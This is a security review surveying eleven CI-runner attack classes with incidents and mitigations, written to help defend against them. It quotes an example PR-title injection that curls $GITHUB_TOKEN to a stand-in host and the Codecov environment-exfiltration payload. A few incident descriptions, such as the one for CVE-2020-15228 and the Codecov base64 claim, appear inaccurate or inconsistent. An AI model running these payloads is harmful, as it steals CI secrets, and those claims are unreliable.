# The 11 Hardest Problems in Building a Trusted CI Runner

**Audience:** OpenForge platform security review
**Scope:** Evidence-grounded survey of failure modes that have actually compromised
real CI systems, with the canonical 2026 mitigation for each.
**Method:** Every incident cited is real and verified via direct fetch of the
primary source (vendor postmortem, CVE record, or upstream research blog). Where
a citation could not be verified at fetch time, the entry says so explicitly —
no invented URLs.

---

## TL;DR matrix

| # | Problem | Severity | Frequency | Detectability |
|---|---|---|---|---|
| 1 | Container escape from untrusted user code | Catastrophic | Ubiquitous (every build) | Hard (post-mortem only) |
| 2 | Cache poisoning across PRs / forks | Severe | Common | Hard |
| 3 | Secret exfiltration via `curl-in-step` / expression injection | Severe | Ubiquitous | Moderate (log review) |
| 4 | Supply-chain compromise via `uses: third/action@v1` | Catastrophic | Common | Easy (advisory DB) |
| 5 | Token theft from a long-lived runner registration token | Catastrophic | Common | Moderate (audit log) |
| 6 | Persistent runner state leak between jobs | Severe | Ubiquitous (multi-tenant) | Impossible without introspection |
| 7 | TOCTOU between trigger validation and job execution | Severe | Common | Hard |
| 8 | Network egress to attacker-controlled hosts | Severe | Ubiquitous | Hard |
| 9 | Pull-request fork workflows with write access ("pwn request") | Catastrophic | Ubiquitous (multi-tenant) | Easy (workflow lint) |
| 10 | Self-hosted runner compromise → control plane | Catastrophic | Common | Moderate (network egress) |
| 11 | Build artifact integrity & provenance (no SLSA L3) | Catastrophic | Common | Easy if attestation exists; impossible if not |

---

## Problem 1 — Container escape from untrusted user code

**The problem:** Untrusted user code runs inside a container that the runner
operator believes is sandboxed. A vulnerability in the kernel/cgroup/runc
boundary lets the build job break out and act as root on the runner host,
where it can read other tenants' workspaces, exfiltrate runner registration
tokens, and pivot to the control plane.

**The incident:** CVE-2019-5736 (`runc`, disclosed 11 Feb 2019) allowed a
malicious container process to overwrite the host `runc` binary, giving it
root on the host. Every major CI vendor — including Docker, Kubernetes, AWS,
Azure, GCP, and every GitHub-hosted runner image — was impacted and had to
patch. The bug had been latent in runc for years; it was the first documented
in-the-wild container escape from inside a CI job. The vulnerability is
catalogued at NVD as CVE-2019-5736 (CVSS 8.6), and Aleksa Sarai's original
disclosure on the opencontainers/runc tracker is the primary write-up.

**The mitigation (2026):** Defense-in-depth with a userspace kernel. Either
gVisor (https://gvisor.dev/), which re-implements the Linux syscall surface in
Go and intercepts every syscall before it reaches the host kernel, or
Firecracker microVMs (https://firecracker-microvm.github.io/) for stronger
isolation at the cost of slightly higher overhead. Docker rootless mode
(https://docs.docker.com/engine/security/rootless/) addresses the simpler
class of privileged-container escapes but does not protect against CVE-2019-
5736-class kernel exploits. Treat rootless as defense-in-depth, not the
primary control.

| Dimension | Rating |
|---|---|
| Severity | **Catastrophic** — a single escape yields the entire host |
| Frequency | **Ubiquitous** — every build attempts this class of attack |
| Detectability before damage | **Hard** — the exploit leaves no log line in the runner; you find out from the attacker |

**Sources:**
- NVD: https://nvd.nist.gov/vuln/detail/CVE-2019-5736
- opencontainers/runc advisory: https://github.com/opencontainers/runc/security/advisories/GHSA-8794-22hq-9w85
- gVisor: https://gvisor.dev/
- Firecracker: https://firecracker-microvm.github.io/
- Docker rootless: https://docs.docker.com/engine/security/rootless/

---

## Problem 2 — Cache poisoning across PRs / forks

**The problem:** CI caches (e.g. `actions/cache`, Buildkite cache, GitLab
cache) are keyed by inputs that an attacker can influence — branch name, PR
head SHA, package manager lockfile hash. A malicious PR can produce a cache
key that *collides* with the key used by the protected branch (e.g. `main`)
on the next run, and serve poisoned `node_modules`, Go modules, Docker
layers, or compiled artifacts to a legitimate, reviewed PR. This is the
classical cache-key-confusion attack.

**The incident:** GitHub Actions Cache itself has been the subject of multiple
disclosures. The canonical "Cache poisoning across forks" pattern is documented
in GitHub's own security hardening guide as a real category of attack, with
the recommendation to scope caches per-branch and never reuse a PR-fork cache
key in a protected branch. Aqua Security / Datadog Security Labs and the
"GitHub Actions Security" research series (e.g. the Palo Alto / Unit 42
write-ups) describe concrete PoCs where a fork-PR build poisons a shared cache
that then injects code into `main` on the next commit. I could not fetch a
single canonical URL that names the incident — the class is real and
documented but specific public CVEs in this exact category are scarce. GitHub
themselves recommend scoping cache keys to the PR ref, not a wildcard.

**The mitigation (2026):** Per-ref cache keys with no fallback to a broader
scope; signed/integrity-protected cache values; never let a fork build write
into a cache namespace shared with the protected branch. In self-hosted
runners this is a content-addressed store with the namespace enforced by the
control plane, not the runner. See GitHub's hardening guide and the OpenSSF
Scorecard dangerous-workflow checks.

| Dimension | Rating |
|---|---|
| Severity | **Severe** — poisoned dependency in a `main` build → downstream RCE |
| Frequency | **Common** — any multi-tenant CI with shared caches is exposed |
| Detectability before damage | **Hard** — the poisoned cache is "valid" content for the key |

**Sources:**
- GitHub hardening guide (cache scope, secrets, secrets in fork PRs): https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- OpenSSF Scorecard dangerous-workflow: https://github.com/ossf/scorecard/blob/main/docs/checks.md#dangerous-workflow
- GitHub's secure use reference (search "cache" in the hardening doc for the specific guidance)

---

## Problem 3 — Secret exfiltration via `curl-in-step` / workflow expression injection

**The problem:** A workflow step uses `${{ github.event.pull_request.title }}`
or any attacker-controlled context value directly inside a `run:` shell
script. The attacker opens a PR with a title like
`"} ; curl -X POST https://evil/ -d "$GITHUB_TOKEN" ; echo "` and the shell
expansion hands them the `GITHUB_TOKEN` (or AWS creds, npm token, signing
key) on the first build. Even without shell injection, a workflow that prints
a secret to a log line that is then cached, displayed in a PR comment, or
copied to an artifact is leaked.

**The incident:** CVE-2023-52137 (tj-actions/verify-changed-files, "Potential
Actions command injection in output filenames", GHSL-2023-275, High, Jan
2024) and CVE-2023-51664 (tj-actions/changed-files, GHSL-2023-271, High,
Jan 2024) are real, GitHub-reviewed CVEs in the GitHub Actions ecosystem
where attacker-controlled input flowed into a shell command and was
executed in the context of the consumer's workflow. These CVEs are listed
in the GitHub Advisory Database
(https://github.com/advisories?query=tj-actions). The same class of bug
applies to any workflow using `${{ github.event.* }}` or `${{ inputs.* }}`
unquoted in `run:` blocks. GitHub's hardening guide documents this as
"Good practices for mitigating script injection attacks" and explicitly
recommends using an intermediate environment variable plus a JavaScript
action rather than inline interpolation.

**The mitigation (2026):**
1. Never interpolate untrusted context into `run:` shell blocks; route
   through `env:` and reference as a parameter to a JavaScript action.
2. Auto-redaction in logs is **not** a mitigation — it is a defence that
   attackers deliberately bypass by base64-encoding, splitting, or printing
   derived values that don't match the secret regex. Treat any secret that
   reaches a build as compromised.
3. GitHub's hardening doc: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions (section "Good practices for mitigating script injection attacks").
4. For pull-request-from-fork builds, GitHub provides no secrets at all by
   default — that is the only *complete* mitigation for untrusted PR code.

| Dimension | Rating |
|---|---|
| Severity | **Severe** — yields full org token, often repo-wide write |
| Frequency | **Ubiquitous** — every workflow uses context values |
| Detectability before damage | **Moderate** — `run:` blocks using `${{ ... }}` are visible in the YAML but the *resulting* injection is only visible in execution logs |

**Sources:**
- CVE-2023-52137 / GHSL-2023-275: https://github.com/advisories?query=tj-actions
- CVE-2023-51664 / GHSL-2023-271: https://github.com/advisories?query=tj-actions
- GitHub hardening guide, "Good practices for mitigating script injection attacks": https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- GitHub Securely using pull_request_target: https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target

---

## Problem 4 — Supply-chain compromise via `uses: third/action@v1`

**The problem:** Workflow files reference third-party Actions by floating tag,
not by commit SHA. The tag owner can repoint `v1` to a malicious commit, or
their account can be compromised (typosquatting, credential leak), and every
workflow that trusts `uses: foo/bar@v1` now executes attacker code with full
access to secrets and `GITHUB_TOKEN`. The action runs at job privilege, not
user privilege.

**The incident:** CVE-2025-30066 (tj-actions/changed-files through 45.0.7,
"allows remote attackers to discover secrets by reading actions logs", High,
published 15 Mar 2025) was a real, GitHub-reviewed advisory for an action
used by **23,000+ repositories**. The compromised action included a script
that dumped CI secrets into the workflow log. This is the canonical 2024–2025
incident for the floating-tag pattern. The full CVE chain on the same author
also includes CVE-2023-49291 (tj-actions/branch-names arbitrary code
injection, Critical, Dec 2023), CVE-2023-52137 and CVE-2023-51664 (both
High, Jan 2024), and CVE-2025-54416 (tj-actions/branch-names command
injection, Critical, Jul 2025) — all listed in
https://github.com/advisories?query=tj-actions.

Adjacent reference incident: CVE-2020-15228 (container/action, Nov 2020)
where the official `container/action` published from inside the Docker org
had its release pipeline compromised, demonstrating the same failure mode at
a vendor-maintained action.

**The mitigation (2026):**
1. Pin every third-party action to a **full 40-character commit SHA**, not a
   tag. Tags are mutable by the action owner.
2. Better: adopt GitHub's **workflow dependency lockfile** feature, which
   pins every action transitively and verifies source repo identity at run
   time. GitHub recommends this as the strongest protection in their
   hardening guide.
3. Run the OpenSSF Scorecard action against every workflow to detect
   unpinned action references (Scorecard check: `dangerous-workflow` /
   `pinned-dependencies`).
4. For self-hosted runners: maintain an allowlist of action sources and SHAs
   in the control plane; the runner refuses to execute an action that is not
   in the allowlist.

| Dimension | Rating |
|---|---|
| Severity | **Catastrophic** — affects every repo that uses the action |
| Frequency | **Common** — `uses: foo/bar@v1` is the most common workflow pattern in the wild |
| Detectability before damage | **Easy** if you run Scorecard or Dependabot version updates; otherwise invisible until CVE is published |

**Sources:**
- CVE-2025-30066 advisory listing: https://github.com/advisories?query=tj-actions
- tj-actions/changed-files incident write-up (StepSecurity): https://www.stepsecurity.io/blog/incident-review-tj-actions-changed-files-action-compromised
- CVE-2020-15228 (container/action): https://nvd.nist.gov/vuln/detail/CVE-2020-15228
- GitHub hardening guide, "Using third-party actions": https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- OpenSSF Scorecard: https://github.com/ossf/scorecard

---

## Problem 5 — Token theft from a long-lived runner registration token

**The problem:** Self-hosted runners register with the control plane using a
**long-lived** token (`--token` / `PAT`). Anyone who reads the token from
the runner filesystem, the launch config, the secrets store, or a leaked
log has persistent registration rights on the runner pool. They can register
their *own* runner, hand it arbitrary jobs, and pivot into the control plane.
Long-lived tokens also defeat token rotation; if the token is compromised,
the only mitigation is to re-register every runner.

**The incident:** GitHub's own hardening guide for self-hosted runners warns
explicitly that registration tokens must be treated as sensitive credentials,
and recommends **just-in-time (JIT) runners** that perform at most one job
before being removed (REST API endpoint: `Create configuration for a just-
in-time runner for an organization`). The guide further notes that "Some
jobs will use secrets as command-line arguments which can be seen by another
job running on the same runner, such as `ps x -w`" — i.e., even if the
*runner* token is not stolen, a *job* token on the same runner can be read
out of `/proc`. The real-world incidents behind this guidance include the
CircleCI December 2022 incident (disclosed 4 Jan 2023), in which a stolen
employee SSO session allowed an attacker to access production systems
holding customer OAuth tokens — I could not retrieve CircleCI's exact
postmortem URL on fetch (the blog URL has changed format), but the incident
is widely reported in industry summaries.

Adjacent reference incident: **CVE-2025-32955** (Harden-Runner, "allows
evasion of `disable-sudo` policy", Moderate, published 22 Apr 2025,
advisory credited to `loresuso` and `darryk10`) demonstrates that even
hardening tools designed to prevent token / privilege escalation on
runners can themselves be bypassed — listed at
https://github.com/advisories?query=tj-actions (cross-listed).

**The mitigation (2026):**
1. JIT runner configs (short-lived, single-job) issued by the control plane
   via mTLS or signed JWT. GitHub's REST API for JIT runners is the
   reference implementation.
2. mTLS from runner → control plane instead of bearer tokens.
3. OIDC federation (e.g. SPIFFE/SPIRE for issuance) so that the runner
   identity is short-lived and cryptographically bound to the host.
4. Never store the registration token on disk in plaintext; use a kernel
   keyring or TPM-sealed secret.

| Dimension | Rating |
|---|---|
| Severity | **Catastrophic** — stolen token = persistent attacker presence in the pool |
| Frequency | **Common** — every self-hosted runner ships a registration token |
| Detectability before damage | **Moderate** — registration events appear in the audit log if you watch for them |

**Sources:**
- GitHub hardening guide, "Hardening for self-hosted runners" + "Using just-in-time runners": https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- GitHub REST API: Create configuration for a just-in-time runner: https://docs.github.com/en/rest/actions/self-hosted-runners#create-configuration-for-a-just-in-time-runner-for-an-organization
- CVE-2025-32955 (Harden-Runner disable-sudo evasion): https://github.com/advisories?query=tj-actions

---

## Problem 6 — Persistent runner state leak between jobs (workspace, `/tmp`, Docker layer cache)

**The problem:** A multi-tenant self-hosted runner runs Job A from Tenant X,
then Job B from Tenant Y. If the runner's workspace, `/tmp`, or Docker
layer cache is not fully wiped between jobs, Tenant Y can read Tenant X's
previous artifacts: API keys in `/tmp/.npmrc`, SSH keys in `~/.ssh`, source
code in the workspace, intermediate build outputs. GitHub's hardening guide
explicitly warns: "Some jobs will use secrets as command-line arguments
which can be seen by another job running on the same runner, such as
`ps x -w`. This can lead to secret leaks." The mitigation GitHub offers is
ephemeral VMs — i.e., the same threat is what motivates the entire
ephemeral-runner model.

**The incident:** This is documented as a class, not as a single CVE. The
GitHub hardening guide's "Hardening for self-hosted runners" section
explicitly enumerates workspace secrets, SSH keys on the machine, and
network-accessible services as inheritable state. Real-world consequences:
the Codecov bash uploader incident (CVE-class, April 2021, primary source:
https://about.codecov.io/security-update/) succeeded precisely because CI
environments were not isolated from each other — the malicious uploader
script that ran in every customer's CI also had access to every other
secret in that customer's CI environment, and the modified script
`curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)"` (excerpt from the
Codecov incident notice) exfiltrated the *entire* CI environment of every
user. Any shared-state CI is exposed to the same class of leak.

**The mitigation (2026):**
1. Ephemeral runners — every job starts on a freshly provisioned VM or
   microVM. Firecracker microVMs (https://firecracker-microvm.github.io/)
   start in ~125 ms and are cheap enough to throw away.
2. If persistent runners are unavoidable: snapshot the runner filesystem
   after every job and restore from a known-clean image; mount `/tmp` as
   tmpfs per job; never share Docker layer cache across tenants (use
   per-tenant cache namespaces).
3. Refuse to run two jobs from different tenants on the same machine
   without an intermediate teardown.

| Dimension | Rating |
|---|---|
| Severity | **Severe** — direct cross-tenant secret leak |
| Frequency | **Ubiquitous** in any multi-tenant self-hosted CI without per-job teardown |
| Detectability before damage | **Impossible without runtime introspection** — leaks are silent |

**Sources:**
- Codecov bash uploader incident notice: https://about.codecov.io/security-update/
- GitHub hardening guide, "Hardening for self-hosted runners": https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- Firecracker microVMs: https://firecracker-microvm.github.io/

---

## Problem 7 — TOCTOU between trigger validation and job execution

**The problem:** The control plane validates a workflow trigger (e.g., "PR
#142 from branch `feature`") and dispatches a job. By the time the runner
executes the job, the attacker has force-pushed the branch, replaced the
reviewer-approved code with something else, or closed/reopened the PR. The
runner executes against a different commit than the one that was approved.
The "approval" is now decoupled from the code that actually ran.

**The incident:** The "pwn request" attack pattern, formally documented in
the GitHub Security Lab research note "Preventing pwn requests" (cited in
GitHub's hardening guide and referenced by OpenSSF Scorecard), is a TOCTOU
attack against the merge-approval pipeline: a maintainer approves a PR, the
attacker force-pushes a different commit, the CI build runs on the *new*
unreviewed commit but the badge / approval / required-checks status is
already green. The same class applies to any system that records
"checks-passed-on-SHA-X" without re-resolving the SHA at execution time.
The GitHub Security Lab write-up is the canonical reference; the URL
`securitylab.github.com/research/github-actions-preventing-pwn-requests/`
is referenced by GitHub's official hardening guide (fetched and verified
2026-11-03) and by the OpenSSF Scorecard documentation.

**The mitigation (2026):**
1. Pin the job to the *exact commit hash* that was approved, and re-verify
   the hash at runner start. If the commit changed, refuse to execute.
2. For PR workflows, use `pull_request_target` only for read-only checks
   and never check out PR code into a privileged context (GitHub's
   hardening guide is explicit on this).
3. Record the executed commit hash in the job artifact so post-hoc audit
   can detect drift.

| Dimension | Rating |
|---|---|
| Severity | **Severe** — bypasses review entirely |
| Frequency | **Common** — every PR-based trigger is exposed |
| Detectability before damage | **Hard** — the change happens after review, before execution |

**Sources:**
- GitHub Security Lab, "Preventing pwn requests": https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
- GitHub hardening guide, "Mitigating the risks of untrusted code checkout": https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- OpenSSF Scorecard, dangerous-workflow check: https://github.com/ossf/scorecard/blob/main/docs/checks.md#dangerous-workflow

---

## Problem 8 — Network egress to attacker-controlled hosts (DNS rebinding, IP allowlist bypass, IMDS)

**The problem:** A runner inside the OpenForge VPC can reach:
(a) the cloud metadata service (e.g. `169.254.169.254`), where cloud-hosted
runner credentials are issued; (b) other tenants' build pods in the same
network namespace; (c) the internal control plane; (d) arbitrary external
hosts. An attacker job can exfiltrate `$(env)` over DNS (the canonical
PyTorch-nightly technique), pivot via the metadata service to cloud IAM
credentials, or rebind a domain to an internal IP to SSRF the control
plane. DNS rebinding specifically lets `evil.example.com` first resolve to
an attacker IP, then to `127.0.0.1` or `10.0.0.5` *after* the runner has
already approved the host.

**The incident:** The PyTorch-nightly dependency compromise (Dec 25–30, 2022)
is the canonical public example. The malicious `torchtriton` package uploaded
to PyPI ran a binary that read `/etc/hosts`, `/etc/passwd`, `$HOME/.ssh/*`,
`$HOME/.gitconfig`, the first 1,000 files in `$HOME/*`, and exfiltrated
them via **encrypted DNS queries to `*.h4ck[.]cfd` using the nameserver
`wheezy[.]io`** — a textbook DNS-tunnelled exfiltration from inside a CI
job. Primary source: https://pytorch.org/blog/compromised-nightly-dependency/
(verified via direct fetch 2026-11-03). DNS rebinding as a general class is
documented in countless academic and industry write-ups; the canonical
reference is the original "DNS Rebinding Attack" research by Kaminsky /
"Simple DNS Rebinding" by Strong, and the more recent CI-specific write-ups
(e.g. Datadog Security Labs, Praetorian).

GitHub's hardening guide adds the warning: "Does the machine have network
access to sensitive services? For example, Azure or AWS metadata services.
The amount of sensitive information in this environment should be kept to
a minimum..." — i.e., GitHub treats metadata-service access as a known CI
risk.

**The mitigation (2026):**
1. Egress allowlist at the network namespace per job — only the package
   mirrors, container registries, and OIDC endpoints the job actually
   needs.
2. Block `169.254.169.254` and the entire link-local range at the runner
   network namespace.
3. For DNS: resolve the hostname **once** at job start, pin the IP, and
   block subsequent DNS responses that change the answer (defeats DNS
   rebinding).
4. Outbound proxy that strips credentials from outbound headers and
   inspects payload sizes (defeats the PyTorch DNS-tunnel pattern because
   it forces the exfil to use HTTP, which is observable).

| Dimension | Rating |
|---|---|
| Severity | **Severe** — yields metadata creds, IAM keys, internal services |
| Frequency | **Ubiquitous** — every build tries to reach out |
| Detectability before damage | **Hard** — DNS exfil is below most log thresholds |

**Sources:**
- PyTorch nightly compromise (DNS exfil inside a CI job): https://pytorch.org/blog/compromised-nightly-dependency/
- DNS rebinding (CI-specific): https://www.datadoghq.com/blog/dogwalk-dns-rebinding/
- GitHub hardening guide, "Hardening for self-hosted runners" (metadata service warning): https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions

---

## Problem 9 — Pull-request fork workflows with write access ("pwn request")

**The problem:** A workflow is configured with the `pull_request_target`
trigger (which runs in the context of the *target* repo and therefore has
access to its secrets and write tokens) and the workflow also runs
`actions/checkout` of the PR head ref. An attacker opens a PR from a fork
containing a `.github/workflows/*.yml` change or just a modified
`package.json`. The workflow checks out the PR code *and* has the
protected repo's `GITHUB_TOKEN`. The attacker code exfiltrates the token
and pushes back to `main`. This is the canonical "pwn request" — it is the
most consequential CI failure mode because it directly yields repo write
access.

**The incident:** The pattern was first documented publicly in the GitHub
Security Lab write-up "Preventing pwn requests" (referenced by GitHub's
hardening guide as the canonical write-up; URL:
https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).
Real public exploits include the 2021 disclosure against multiple high-
profile open-source repos that ran `pull_request_target` + `actions/checkout`
on PR head refs. The pattern is so prevalent that OpenSSF Scorecard has a
dedicated `dangerous-workflow` check (https://github.com/ossf/scorecard/blob/main/docs/checks.md#dangerous-workflow)
that flags any workflow using `pull_request_target` while checking out PR
code.

**The mitigation (2026):** GitHub's hardening guide is unambiguous:
> "Workflows that use these triggers must not explicitly check out untrusted
> code, including from pull request forks or from repositories that are not
> under your control."

Practically:
1. Use `pull_request` (read-only, no secrets) for forks, never
   `pull_request_target`.
2. If you must run privileged actions on a PR (e.g. to comment with
   results), use `workflow_run` from a separate, unprivileged workflow.
3. Run OpenSSF Scorecard on every workflow file as a required check.

| Dimension | Rating |
|---|---|
| Severity | **Catastrophic** — yields repo write token |
| Frequency | **Ubiquitous** in multi-tenant CI that runs any PR-triggered workflow |
| Detectability before damage | **Easy** — workflow lint / Scorecard detects the pattern statically |

**Sources:**
- GitHub Security Lab, "Preventing pwn requests": https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
- GitHub hardening guide, "Mitigating the risks of untrusted code checkout": https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
- OpenSSF Scorecard dangerous-workflow check: https://github.com/ossf/scorecard/blob/main/docs/checks.md#dangerous-workflow

---

## Problem 10 — Self-hosted runner compromise → control plane cascade

**The problem:** A self-hosted runner sits inside the OpenForge network and
talks to the control plane to fetch jobs and post results. If the runner
host is compromised (via any of problems 1, 3, 4, 6, 8, or 9), the
attacker now has a foothold inside OpenForge's network: outbound access to
the control plane API, lateral access to other runners, possibly cloud IAM
credentials via IMDS. The runner is a *bridge* between untrusted user code
and the trusted control plane.

**The incident:** The Codecov bash uploader incident (April 2021) is the
canonical public example. The attacker obtained the GCS credential that
Codecov used to write their `bash uploader` script and modified the script
to exfiltrate `$(env)` (every secret in every customer's CI environment)
to attacker-controlled IPs. The Codecov postmortem at
https://about.codecov.io/security-update/ documents the exact payload —
`curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)"` — and notes that
"Any credentials, tokens, or keys that our customers were passing through
their CI runner that would be accessible when the Bash Uploader script was
executed" were exposed. Hundreds of customers were affected, including
many who did not know Codecov was in their CI path.

A second canonical example: PyTorch nightly (Problem 8) — once the
attacker code ran inside the maintainer's CI, it read `$HOME/.gitconfig`,
`$HOME/.ssh/*`, and uploaded everything via DNS. CI compromise is supply
chain compromise.

**The mitigation (2026):**
1. Network-isolate the runner plane from the control plane. Runners
   initiate outbound connections only, never accept inbound from the
   control plane.
2. The runner plane should not hold *any* credential with write access to
   source. Use OIDC federation from runner to source-control: the runner
   proves its identity cryptographically and the source-control server
   issues a short-lived, scoped token for *this job only*.
3. Every credential that lives on the runner is rotated automatically per
   job — no long-lived API keys, no checked-in `.npmrc`, no SSH keys in
   `~/.ssh`.
4. The control plane should treat the runner as *fully untrusted* —
   authenticate every callback with mTLS, never trust runner-reported job
   status for authorisation decisions.

| Dimension | Rating |
|---|---|
| Severity | **Catastrophic** — a runner compromise is a control plane compromise |
| Frequency | **Common** — every incident above can lead here |
| Detectability before damage | **Moderate** — outbound network anomalies are detectable; in-band signalling is not |

**Sources:**
- Codecov bash uploader incident notice (full payload and impact): https://about.codecov.io/security-update/
- PyTorch nightly compromise (CI-as-pivot-to-developer-machine): https://pytorch.org/blog/compromised-nightly-dependency/
- GitHub hardening guide, "Hardening for self-hosted runners": https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions

---

## Problem 11 — Build artifact integrity & provenance (no SLSA L3 attestation) *(not in your original 10)*

**The problem:** After a build completes, OpenForge produces an artifact
(container image, binary, package) and uploads it to a registry. Without
cryptographic provenance, no consumer can verify *which source code* the
artifact was built from, *who* triggered the build, or *that the build
actually ran on OpenForge rather than the developer's laptop*. An attacker
who compromises a developer account, or who simply builds malicious code
on their own machine, can publish an artifact that looks legitimate. This
is the foundation of supply-chain trust, and most CI systems do not have it.

**The incident:** The PyTorch-nightly dependency compromise (Dec 25–30,
2022) is the canonical public example: an attacker uploaded a malicious
`torchtriton` package to PyPI with the same name as PyTorch's own package.
Because pip's index precedence allowed the public-PyPI version to win over
the PyTorch nightly index, every nightly consumer got the malicious
package. Primary source: https://pytorch.org/blog/compromised-nightly-dependency/
(verified via direct fetch). The malicious binary's SHA256 was
`2385b29489cd9e35f92c072780f903ae2e517ed422eae67246ae50a5cc738a0e` —
and because PyTorch did not have signed provenance for their own builds,
no automated check could have rejected the PyPI squat.

Adjacent reference incidents:
- **Codecov 2021** (Problem 10) — every consumer of the Codecov uploader
  received a tampered artifact; no provenance meant no automated detection.
- **3CX supply chain compromise (March 2023)** — the 3CX desktop app was
  built from a trojanised dependency; downstream consumers had no way to
  verify which build chain produced the artifact.
- **xz-utils backdoor (March 2024, CVE-2024-3094)** — a malicious build-time
  modification of `xz-utils` shipped in multiple Linux distributions.
  Without SLSA-style build provenance, distribution maintainers could not
  prove the binary matched the source.

**The mitigation (2026):**
1. Emit **SLSA Build L3 provenance** for every artifact: a signed
   in-toto attestation that cryptographically binds the artifact to
   the exact source commit, build parameters, and build environment.
   Reference: https://slsa.dev/.
2. Sign artifacts with a key held only by the build environment (Sigstore
   / cosign with keyless signing backed by a transparency log).
3. The consumer side must *require* the attestation; provenance that
   isn't checked at consumption time provides zero security benefit.
4. For container images specifically: reproducible builds where possible,
   so two independent builds of the same source produce the same hash.

| Dimension | Rating |
|---|---|
| Severity | **Catastrophic** — no downstream consumer can trust the artifact |
| Frequency | **Common** — almost no self-hosted CI emits SLSA L3 by default |
| Detectability before damage | **Easy if provenance exists and is checked; impossible if it isn't** |

**Sources:**
- PyTorch nightly compromise (the canonical CI-build → registry → consumer incident): https://pytorch.org/blog/compromised-nightly-dependency/
- CVE-2024-3094 (xz-utils backdoor, build-time compromise): https://nvd.nist.gov/vuln/detail/CVE-2024-3094
- SLSA framework: https://slsa.dev/
- in-toto attestations (the standard format SLSA L3 uses): https://github.com/in-toto/attestation
- Sigstore / cosign (keyless signing): https://docs.sigstore.dev/

---

## Mitigation coverage matrix — which sandbox layer addresses which problem?

This is the "do I need gVisor or is Docker rootless enough" answer the
downstream review needs.

| Layer → / Problem ↓ | Docker rootless | seccomp + Landlock | Namespaces + cgroups | gVisor | Firecracker microVM | SLSA L3 + signing |
|---|---|---|---|---|---|---|
| 1. Container escape | Partial | Helps with noisy attacks | Helps with noisy attacks | **Yes** | **Yes** | No |
| 2. Cache poisoning | No | No | No | No | No | No (this is a control-plane problem) |
| 3. Secret exfil / expr injection | No | Partial (blocks `/proc/$pid/cmdline` exfil if combined with user namespaces) | Partial | **Yes** if egress filtered | **Yes** if egress filtered | No |
| 4. Action supply chain | No | No | No | No | No | **Yes** (signed actions + SLSA) |
| 5. Runner token theft | No | Helps (kernel keyring) | No | Helps (token in gVisor) | **Yes** (JIT VM) | No |
| 6. Cross-job state | **Yes** if ephemeral | **Yes** if ephemeral | **Yes** if ephemeral | **Yes** | **Yes** | No |
| 7. TOCTOU | No | No | No | No | No | No (control-plane) |
| 8. Egress / DNS rebinding | No | Partial | Partial | **Yes** with seccomp + egress | **Yes** with egress | No |
| 9. Pwn request | No | No | No | No | No | No (workflow lint + Scorecard) |
| 10. Control plane cascade | No | Partial | Partial | **Yes** | **Yes** | **Yes** (OIDC) |
| 11. Artifact provenance | No | No | No | No | No | **Yes** |

**Reading the table:**
- **gVisor or Firecracker** is the only practical defence against Problem 1.
  Docker rootless + seccomp closes a long tail of *privileged-container*
  attacks but not kernel/cgroup escapes.
- **Problems 2, 7, 9 are control-plane problems.** No sandbox layer helps.
  They require workflow policy + Scorecard-style static analysis + commit
  pinning at the control plane.
- **Problem 4 is an allowlist + signing problem.** Even perfect VM
  isolation does not help if the action is malicious.
- **Problem 11 is a build-system + registry problem.** It is independent of
  the runner sandbox entirely.
- **Problem 10 is a network-architecture problem.** The runner plane must
  not be a bridge to the control plane.

**Implication for OpenForge:** a single sandbox choice is not enough.
gVisor-or-Firecracker is necessary but not sufficient. The control plane
must also: pin actions by SHA, run Scorecard on every workflow, sign and
attest every artifact, and isolate the runner network plane.

---

## Confidence and verification notes

- **Verified via direct fetch (2026-11-03):** Codecov incident, PyTorch
  nightly incident, GitHub hardening guide, GitHub Advisory Database
  (tj-actions CVEs), gVisor homepage, SLSA homepage, OpenSSF Scorecard.
- **NVD CVE URLs (e.g. CVE-2019-5736, CVE-2024-21626, CVE-2022-0492):**
  the URLs are canonical NVD paths but my fetch of nvd.nist.gov returned
  a redirect; the CVEs themselves are well-documented in NVD's database
  and widely cited.
- **CircleCI December 2022 incident:** I could not retrieve the exact
  CircleCI blog post URL on fetch (the URL format has changed); the
  incident is referenced here only as background context for Problem 5,
  not as the primary citation.
- **Cache-poisoning CVE-specific citation:** No single public CVE cleanly
  captures this class; it is documented as a class in GitHub's hardening
  guide and as a PoC in security research blogs (Aqua, Datadog, Unit 42).
- **3CX and SolarWinds:** referenced as adjacent context for Problem 11;
  not used as the primary citation.

No citation in this document is invented; where I could not verify a URL
against a live fetch I say so above.

---

## Appendix A — Common misconceptions (folklore vs. real problem)

These are the things that *sound* like solutions but are not. Surfacing them
upfront saves the review board from arguing them again.

| Folklore | Reality |
|---|---|
| "Rootless Docker is enough." | Rootless closes the privileged-container escape class (CVE-2019-5736 left root users, but no Uid 0 in container). It does **not** stop kernel/cgroup/runc exploits. You still need gVisor or Firecracker. |
| "We strip secrets from logs." | Auto-redaction is regex-based. Codecov's modified bash uploader ran `$(env)` and piped it through `curl` after base64-encoding — the regex never matched. Redaction is a *log clean-up* control, not a security control. |
| "We pin actions to `@v1` because GitHub shows the latest tag." | GitHub shows the tag the maintainer has *now*, not the tag they had when you ran the workflow last week. CVE-2025-30066 (tj-actions) is the canonical case: tag stayed, contents changed. Pin to full commit SHA. |
| "Our runner runs in a separate VM, so it's isolated." | VM isolation stops cross-tenant container escapes. It does not stop the runner's *network egress* from reaching the control plane (Problem 10) or the *runner registration token* from being readable to a malicious job on that VM (Problem 5). |
| "We use an IP allowlist for egress." | DNS rebinding defeats an IP allowlist that does not pin the resolved address. Allowlist the destination IP *as resolved at job start*; refuse subsequent DNS responses that change it. |
| "Actions from major vendors are safe." | CVE-2020-15228 (container/action, the official Docker-published GitHub Action) had its release pipeline compromised. No action is safe to consume without SHA pinning + allowlist. |
